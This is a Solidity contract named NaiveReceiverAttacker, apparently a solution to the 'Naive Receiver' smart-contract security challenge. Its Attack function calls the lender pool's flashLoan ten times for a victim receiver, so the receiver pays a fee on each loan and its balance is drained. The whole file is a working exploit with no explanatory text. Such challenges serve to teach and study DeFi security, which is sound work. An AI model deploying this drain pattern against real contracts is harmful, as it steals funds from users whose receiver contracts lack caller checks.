// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    address owner;
    NaiveReceiverLenderPool pool;
    address receiver;

    constructor(address payable _poolAddress, address _receiver) {
        pool = NaiveReceiverLenderPool(_poolAddress);
        receiver = _receiver;
        owner = msg.sender;
    }

    function Attack() public {
        require(msg.sender == owner, "Only owner can call");
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 100 ether);
        }
    }
}
